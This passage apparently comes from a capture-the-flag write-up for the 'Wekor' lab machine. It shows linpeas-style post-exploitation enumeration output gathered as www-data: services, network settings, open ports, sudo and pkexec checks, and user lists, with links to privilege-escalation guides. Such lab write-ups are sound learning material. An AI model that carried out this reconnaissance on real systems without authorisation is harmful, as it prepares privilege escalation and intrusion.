:1.25                                     1276 indicator-sessi lightdm          :1.25         session-c1.scope          c1         -                  
:1.26                                     1272 indicator-power lightdm          :1.26         session-c1.scope          c1         -                  
:1.28                                     1319 rtkit-daemon    root             :1.28         rtkit-daemon.service      -          -                  
:1.29                                     1273 indicator-datet lightdm          :1.29         session-c1.scope          c1         -                  
:1.30                                     1315 pulseaudio      lightdm          :1.30         session-c1.scope          c1         -                  
:1.31                                     1274 indicator-keybo lightdm          :1.31         session-c1.scope          c1         -                  
:1.32                                     1275 indicator-sound lightdm          :1.32         session-c1.scope          c1         -                  
:1.33                                     1312 unity-settings- lightdm          :1.33         session-c1.scope          c1         -                  
:1.34                                     1348 upowerd         root             :1.34         upower.service            -          -                  
:1.35                                     1266 nm-applet       lightdm          :1.35         session-c1.scope          c1         -                  
:1.36                                     1360 colord          colord           :1.36         colord.service            -          -                  
:1.4                                       657 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
:1.41                                     1631 cupsd           root             :1.41         cups.service              -          -                  
:1.42                                     1632 cups-browsed    root             :1.42         cups-browsed.service      -          -                  
:1.43                                     1632 cups-browsed    root             :1.43         cups-browsed.service      -          -                  
:1.5                                       708 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
:1.51                                     8836 busctl          www-data         :1.51         apache2.service           -          -                  
:1.8                                       709 NetworkManager  root             :1.8          NetworkManager.service    -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
com.ubuntu.LanguageSelector                  - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                - -               -                (activatable) -                         -         
com.ubuntu.SystemService                     - -               -                (activatable) -                         -         
com.ubuntu.USBCreator                        - -               -                (activatable) -                         -         
com.ubuntu.WhoopsiePreferences               - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant              - -               -                (activatable) -                         -         
fi.w1.wpa_supplicant1                        - -               -                (activatable) -                         -         
io.snapcraft.SnapdLoginService               - -               -                (activatable) -                         -         
org.bluez                                    - -               -                (activatable) -                         -         
org.debian.apt                               - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   657 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      665 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              1360 colord          colord           :1.36         colord.service            -          -                  
org.freedesktop.DBus                       668 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.DisplayManager             768 lightdm         root             :1.14         lightdm.service           -          -                  
org.freedesktop.ModemManager1                - -               -                (activatable) -                         -         
org.freedesktop.NetworkManager             709 NetworkManager  root             :1.8          NetworkManager.service    -          -                  
org.freedesktop.PackageKit                   - -               -                (activatable) -                         -         
org.freedesktop.PolicyKit1                 758 polkitd         root             :1.11         polkitd.service           -          -                  
org.freedesktop.RealtimeKit1              1319 rtkit-daemon    root             :1.28         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                      - -               -                (activatable) -                         -         
org.freedesktop.UPower                    1348 upowerd         root             :1.34         upower.service            -          -                  
org.freedesktop.fwupd                        - -               -                (activatable) -                         -         
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     708 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
org.freedesktop.network1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.resolve1                     - -               -                (activatable) -                         -         
org.freedesktop.systemd1                     1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.thermald                     - -               -                (activatable) -                         -         
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
osboxes
127.0.0.1	localhost
127.0.1.1	osboxes
127.0.0.1	site.wekor.thm
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
```

## Privilege Escalation
```text
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:fd:39:13:41:2d  
          inet addr:10.10.101.47  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::fd:39ff:fe13:412d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:240237 errors:0 dropped:0 overruns:0 frame:0
          TX packets:208554 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:16745913 (16.7 MB)  TX bytes:28412959 (28.4 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:995 errors:0 dropped:0 overruns:0 frame:0
          TX packets:995 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:114056 (114.0 KB)  TX bytes:114056 (114.0 KB)

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing
You can sniff with tcpdump!

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb was found in PATH

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
Orka:x:1001:1001::/home/Orka:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1001(Orka) gid=1001(Orka) groups=1001(Orka)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(lightdm) gid=114(lightdm) groups=114(lightdm)
uid=109(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=110(avahi-autoipd) gid=119(avahi-autoipd) groups=119(avahi-autoipd)
uid=111(avahi) gid=120(avahi) groups=120(avahi)
uid=112(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=113(colord) gid=123(colord) groups=123(colord)
uid=114(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=117(pulse) gid=124(pulse) groups=124(pulse),29(audio)
uid=118(rtkit) gid=126(rtkit) groups=126(rtkit)
uid=119(saned) gid=127(saned) groups=127(saned),122(scanner)
uid=120(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=121(mysql) gid=129(mysql) groups=129(mysql)
uid=122(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=123(memcache) gid=130(memcache) groups=130(memcache)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
